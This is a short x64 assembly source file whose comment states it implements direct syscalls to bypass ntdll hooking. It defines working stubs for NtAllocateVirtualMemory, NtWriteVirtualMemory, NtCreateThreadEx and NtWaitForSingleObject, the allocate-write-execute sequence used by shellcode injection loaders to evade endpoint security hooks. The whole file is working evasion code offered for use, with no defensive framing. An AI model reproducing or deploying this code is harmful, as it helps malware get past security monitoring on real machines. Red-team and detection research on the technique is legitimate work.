; x64 syscalls to bypass ntdll hooking
; https://redops.at/en/blog/direct-syscalls-vs-indirect-syscalls


EXTERN NtAllocateSSN:DWORD
EXTERN NtWriteSSN:DWORD
EXTERN NtCreateThreadSSN:DWORD
EXTERN NtWaitObjSSN:DWORD


.code

NtAllocateVirtualMemory PROC
	mov r10,rcx
	mov eax,NtAllocateSSN
	syscall
	ret
NtAllocateVirtualMemory ENDP

NtWriteVirtualMemory PROC
	mov r10,rcx
	mov eax,NtWriteSSN
	syscall
	ret
NtWriteVirtualMemory ENDP

NtCreateThreadEx PROC
	mov r10,rcx
	mov eax,NtCreateThreadSSN
	syscall
	ret
NtCreateThreadEx ENDP

NtWaitForSingleObject PROC
    mov r10, rcx
    mov eax, NtWaitObjSSN
    syscall
    ret
NtWaitForSingleObject ENDP

END
